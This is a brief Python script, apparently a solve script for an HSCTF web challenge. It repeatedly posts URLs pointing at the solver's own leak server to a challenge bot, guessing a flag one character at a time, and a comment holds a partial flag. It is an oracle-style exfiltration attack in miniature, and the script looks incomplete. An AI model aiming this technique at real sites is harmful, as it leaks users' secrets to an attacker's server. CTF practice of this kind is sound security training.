import time
import requests

flag = ""
#flag = "flag{guessgod_nkdtcfpoghau"
my_leakpy_server = ""

MAX_POST = 2
for c in "_{}abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789":
    for _ in range(MAX_POST):
        res = requests.post("http://web1.hsctf.com:8000/hsgtf", data={"url": f"{my_leakpy_server}/{flag + c}"})
        time.sleep(1)
        #print(res.status_code)
        #print(res.text)